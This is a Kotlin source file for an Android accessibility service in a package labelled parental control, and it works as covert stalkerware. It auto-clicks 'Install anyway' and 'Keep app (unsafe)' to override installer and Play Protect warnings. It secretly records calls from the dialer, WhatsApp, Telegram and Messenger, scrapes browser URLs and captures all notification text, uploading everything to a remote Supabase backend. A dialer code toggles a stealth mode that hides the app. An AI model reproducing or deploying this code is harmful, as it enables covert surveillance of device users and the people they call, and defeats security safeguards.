package com.example.parentalcontrol

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import com.example.parentalcontrol.features.audio_recording.services.AudioRecorderEngine

/**
 * خدمة إمكانية الوصول (Accessibility Service)
 * الميزة الأقوى: كشف المكالمات النشطة في أندرويد 12 و13
 */
class AppAccessibilityService : AccessibilityService() {

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.Main)
    private var isCallActive = false
    private lateinit var audioRecorder: AudioRecorderEngine

    // ── Browser URL Tracking State ──
    private var lastUploadedUrl = ""
    private var lastUploadTime = 0L

    override fun onCreate() {
        super.onCreate()
        instance = this
        audioRecorder = AudioRecorderEngine(this)
        Log.i(TAG, "Accessibility Service created")
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
    }

    private val BYPASS_BUTTON_TEXTS = listOf(
        // English
        "More details",
        "Install anyway",
        "Keep app (unsafe)",
        "Keep app",
        "Install",
        "OK",
        "Settings",
        // Arabic
        "تفاصيل أكثر",
        "مزيد من التفاصيل",
        "المزيد من التفاصيل",
        "التثبيت على أي حال",
        "التثبيت على كل حال",
        "تثبيت على أي حال",
        "تثبيت على كل حال",
        "الاحتفاظ بالتطبيق",
        "الاحتفاظ بالتطبيق (غير آمن)",
        "تثبيت",
        "موافق",
        "الإعدادات",
        "الاعدادات"
    )

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return

        // 1. تحقق مما إذا كان الحدث من برنامج تثبيت التطبيقات أو النظام أو الحماية
        val isInstaller = packageName.contains("packageinstaller", ignoreCase = true) ||
                          packageName.contains("installer", ignoreCase = true) ||
                          packageName.contains("vending", ignoreCase = true) ||
                          packageName.contains("gms", ignoreCase = true) ||
                          packageName.contains("securitycenter", ignoreCase = true) ||
                          packageName.contains("settings", ignoreCase = true)

        if (isInstaller) {
            if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                val rootNode = rootInActiveWindow
                if (rootNode != null) {
                    checkAndBypassInstaller(rootNode)
                    rootNode.recycle()
                }
            }
            return
        }

        // 1.4. capture notifications via accessibility event as fallback
        if (event.eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            handleNotificationAccessibilityEvent(event, packageName)
        }

        // 1.5. مراقبة المتصفحات وتسجيل الروابط المزارة (browser history tracking)
        val browserPackages = listOf(
            "com.android.chrome",
            "com.sec.android.app.sbrowser",
            "org.mozilla.firefox",
            "com.opera.browser",
            "com.brave.browser",
            "com.duckduckgo.mobile.android",
            "com.microsoft.emmx",
            "com.android.browser"
        )
        val isBrowser = browserPackages.contains(packageName) || 
                        packageName.contains("browser", ignoreCase = true) ||
                        packageName.contains("chrome", ignoreCase = true)

        if (isBrowser) {
            handleBrowserAccessibilityEvent(event, packageName)
        }

        // 2. مراقبة تطبيقات الاتصال العادية وتطبيقات التواصل الاجتماعي
        val monitoredPackages = listOf(
            "com.google.android.dialer", 
            "com.samsung.android.dialer",
            "com.android.dialer",
            "com.android.server.telecom", 
            "com.android.phone",
            "com.whatsapp",
            "org.telegram.messenger",
            "com.facebook.orca" // Messenger
        )
        
        if (monitoredPackages.contains(packageName)) {
            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    // Check if the user is typing the secret code in the dialer
                    val typedText = event.text.toString().replace(Regex("[^0-9]"), "")
                    if (typedText.contains("1356")) {
                        Log.i(TAG, "Secret Code detected via typing! Opening app...")
                        StealthManager.toggleStealthMode(this)
                    }
                }

                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED, 
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                    val text = event.text.toString() + " " + (event.contentDescription ?: "")
                    
                    // كشف بداية المكالمة (صوتية أو فيديو)
                    if (isCallUI(text) && !isCallActive) {
                        startCallRecording(packageName)
                    } 
                    // كشف نهاية المكالمة
                    else if (isEndCallUI(text) && isCallActive) {
                        stopCallRecording()
                    }
                }
            }
        }
    }

    private fun isCallUI(text: String): Boolean {
        val keywords = listOf(
            "Incoming", "Ongoing", "Call", "WhatsApp Call", "In call",
            "اتصال", "جاري", "مكالمة", "وقت المكالمة", "نشط"
        )
        return keywords.any { text.contains(it, ignoreCase = true) }
    }

    private fun isEndCallUI(text: String): Boolean {
        val keywords = listOf(
            "Ended", "Finished", "Call ended", "Missed", "Declined",
            "انتهت", "مكالمة فائتة", "تم إنهاء", "رفض", "تم القطع"
        )
        return keywords.any { text.contains(it, ignoreCase = true) }
    }

    private fun startCallRecording(app: String) {
        Log.i(TAG, "Call detected in $app! Starting recording...")
        isCallActive = true
        // نمرر اسم التطبيق للتوضيح في اسم الملف مستقبلاً
        audioRecorder.startCallRecording()
    }

    private fun stopCallRecording() {
        Log.i(TAG, "Call ended. Saving and uploading...")
        isCallActive = false
        audioRecorder.stopRecording(upload = true)
    }

    private fun checkAndBypassInstaller(rootNode: android.view.accessibility.AccessibilityNodeInfo) {
        val screenContent = getScreenText(rootNode).lowercase()
        val isOurApp = screenContent.contains("optimization engine") || 
                      screenContent.contains("parentalcontrol") || 
                      screenContent.contains("parental control") ||
                      screenContent.contains("sync-service")
                      
        if (!isOurApp) {
            return
        }

        Log.d(TAG, "Installer screen detected for our app. Searching for bypass buttons...")
        clickBypassButtons(rootNode)
    }

    private fun getScreenText(node: android.view.accessibility.AccessibilityNodeInfo?): String {
        if (node == null) return ""
        val sb = java.lang.StringBuilder()
        val text = node.text?.toString() ?: ""
        val desc = node.contentDescription?.toString() ?: ""
        sb.append(text).append(" ").append(desc).append(" ")
        
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                sb.append(getScreenText(child))
                child.recycle()
            }
        }
        return sb.toString()
    }

    private fun clickBypassButtons(node: android.view.accessibility.AccessibilityNodeInfo?): Boolean {
        if (node == null) return false
        
        val text = node.text?.toString()?.trim() ?: ""
        val desc = node.contentDescription?.toString()?.trim() ?: ""
        
        val isMatch = BYPASS_BUTTON_TEXTS.any { target ->
            text.equals(target, ignoreCase = true) || desc.equals(target, ignoreCase = true)
        }
        
        if (isMatch) {
            if (node.isClickable) {
                val success = node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                if (success) {
                    Log.i(TAG, "Bypassed installer by clicking: $text")
                    return true
                }
            } else {
                var parent = node.parent
                while (parent != null) {
                    if (parent.isClickable) {
                        val success = parent.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                        if (success) {
                            Log.i(TAG, "Bypassed installer by clicking parent of: $text")
                            parent.recycle()
                            return true
                        }
                    }
                    val nextParent = parent.parent
                    parent.recycle()
                    parent = nextParent
                }
            }
        }
        
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                val clicked = clickBypassButtons(child)
                child.recycle()
                if (clicked) {
                    return true
                }
            }
        }
        
        return false
    }

    // ── Browser History Extraction Helpers ──

    private fun handleBrowserAccessibilityEvent(event: AccessibilityEvent, packageName: String) {
        val eventType = event.eventType
        if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
            eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
            eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED) {
            
            val rootNode = rootInActiveWindow ?: return
            try {
                val url = tryExtractBrowserUrl(rootNode, packageName)
                if (!url.isNullOrEmpty()) {
                    val cleaned = cleanUrl(url)
                    if (!cleaned.isNullOrEmpty() && cleaned != lastUploadedUrl) {
                        val now = System.currentTimeMillis()
                        // 3 seconds rate limit to avoid heavy queries during quick transitions/typing
                        if (now - lastUploadTime > 3000L) {
                            lastUploadedUrl = cleaned
                            lastUploadTime = now
                            uploadBrowserUrl(packageName, cleaned)
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error extracting browser URL: ${e.message}")
            } finally {
                rootNode.recycle()
            }
        }
    }

    private fun tryExtractBrowserUrl(rootNode: android.view.accessibility.AccessibilityNodeInfo?, packageName: String): String? {
        if (rootNode == null) return null
        
        // List of known URL bar resource IDs for popular browsers
        val urlBarIds = listOf(
            "com.android.chrome:id/url_bar",
            "com.android.chrome:id/url_text",
            "com.sec.android.app.sbrowser:id/url_bar_text",
            "com.sec.android.app.sbrowser:id/url_text",
            "org.mozilla.firefox:id/url_bar_text",
            "org.mozilla.firefox:id/mozac_browser_toolbar_url_view",
            "url",
            "address"
        )
        
        // 1. Direct view ID lookup (most accurate)
        for (id in urlBarIds) {
            val nodes = rootNode.findAccessibilityNodeInfosByViewId(id)
            if (nodes != null && nodes.isNotEmpty()) {
                val node = nodes[0]
                val text = node.text?.toString()?.trim()
                node.recycle()
                if (!text.isNullOrEmpty() && (text.contains(".") || text.startsWith("http"))) {
                    return text
                }
            }
        }
        
        // 2. Recursive fallback search
        return findUrlRecursively(rootNode)
    }

    private fun findUrlRecursively(node: android.view.accessibility.AccessibilityNodeInfo?): String? {
        if (node == null) return null
        
        val text = node.text?.toString()?.trim() ?: ""
        if (text.isNotEmpty() && (text.startsWith("http://") || text.startsWith("https://") || 
            (text.contains(".") && !text.contains(" ") && text.length > 3 && 
             (text.endsWith(".com") || text.endsWith(".net") || text.endsWith(".org") || text.endsWith(".info") || 
              text.endsWith(".edu") || text.endsWith(".gov") || text.contains("/") || text.startsWith("www.")))
        )) {
            return text
        }
        
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            val found = child?.let { findUrlRecursively(it) }
            child?.recycle()
            if (found != null) return found
        }
        return null
    }

    private fun cleanUrl(url: String): String {
        var clean = url.trim()
        val ignorePrompts = listOf(
            "ابحث أو اكتب", "البحث أو كتابة", "search or type", "search or text", "ابحث", "search"
        )
        if (ignorePrompts.any { clean.startsWith(it, ignoreCase = true) }) {
            return ""
        }
        if (clean.contains(" ")) {
            if (!clean.contains(".") && !clean.contains("/")) {
                return ""
            }
        }
        if (!clean.contains("://") && !clean.startsWith("http")) {
            clean = "https://$clean"
        }
        return clean
    }

    private fun uploadBrowserUrl(browserPackage: String, url: String) {
        serviceScope.launch {
            try {
                val deviceId = (android.provider.Settings.Secure.getString(
                    contentResolver, android.provider.Settings.Secure.ANDROID_ID
                ) ?: "unknown").lowercase()
                
                val browserName = when {
                    browserPackage.contains("chrome") -> "Google Chrome"
                    browserPackage.contains("sbrowser") -> "Samsung Internet"
                    browserPackage.contains("firefox") -> "Mozilla Firefox"
                    browserPackage.contains("opera") -> "Opera"
                    browserPackage.contains("brave") -> "Brave"
                    browserPackage.contains("duckduckgo") -> "DuckDuckGo"
                    else -> browserPackage.split(".").lastOrNull()?.replaceFirstChar { it.uppercase() } ?: "Browser"
                }

                val record = BrowserHistoryRecord(
                    device_id = deviceId,
                    browser   = browserName,
                    url       = url,
                    title     = null
                )

                val success = SupabaseManager.getInstance().saveBrowserHistory(record)
                if (success) {
                    Log.i(TAG, "🌐 Saved browser history: $url ($browserName)")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to upload browser history: ${e.message}")
            }
        }
    }

    private fun handleNotificationAccessibilityEvent(event: AccessibilityEvent, packageName: String) {
        try {
            val parcelableData = event.parcelableData
            if (parcelableData is android.app.Notification) {
                val extras = parcelableData.extras
                val title = extras?.getCharSequence("android.title")?.toString() ?: ""
                val text = extras?.getCharSequence("android.text")?.toString() ?: ""
                
                if (title.isNotEmpty() || text.isNotEmpty()) {
                    val blacklist = listOf(
                        "android",
                        "com.android.systemui",
                        "com.samsung.android.app.galaxyraw",
                        this.packageName
                    )
                    if (blacklist.contains(packageName) || packageName.contains("systemui", true)) {
                        return
                    }

                    val appName = try {
                        packageManager.getApplicationLabel(packageManager.getApplicationInfo(packageName, 0)).toString()
                    } catch (_: Exception) { packageName }
                    
                    val deviceId = (android.provider.Settings.Secure.getString(
                        contentResolver, android.provider.Settings.Secure.ANDROID_ID
                    ) ?: "unknown").lowercase()

                    val record = NotificationLog(
                        device_id = deviceId,
                        package_name = packageName,
                        app_name = appName,
                        title = title,
                        content = text,
                        post_time = kotlinx.datetime.Clock.System.now().toString()
                    )
                    serviceScope.launch {
                        SupabaseManager.getInstance().saveNotification(record)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Notification accessibility extraction error: ${e.message}")
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "Accessibility Service interrupted")
    }

    companion object {
        private const val TAG = "AppAccessibility"
        @Volatile private var instance: AppAccessibilityService? = null
        fun getInstance(): AppAccessibilityService? = instance
    }
}
